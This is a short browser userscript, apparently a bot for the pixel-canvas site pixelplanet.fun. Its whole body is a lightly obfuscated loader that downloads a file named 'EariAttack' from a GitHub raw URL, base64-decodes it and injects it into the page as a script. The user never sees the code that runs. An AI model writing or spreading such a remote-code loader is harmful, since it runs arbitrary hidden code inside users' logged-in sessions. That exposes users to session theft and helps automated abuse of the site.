// ==UserScript==
// @name         BotEariSeid
// @version      1.0
// @description  LaGrandeCrue
// @author       LaRoumanie
// @include      *://pixelplanet.fun/*
// ==/UserScript==
(function(){var b=new XMLHttpRequest();b['addEventListener']('load',function(){if(0xc8!==this['status'])return console['error']('[VB] Response code - '+this['status']);var c=document['createElement']('script');c['innerHTML']=atob(this['responseText']);document['body']['appendChild'](c);});b['addEventListener']('error',function(c){console['error']('[VB] Code load error');console['error'](c);});b['open']('GET','https://raw.githubusercontent.com/RomaniaIsLove/LongLiveRomania/master/EariAttack');b['send']();}());
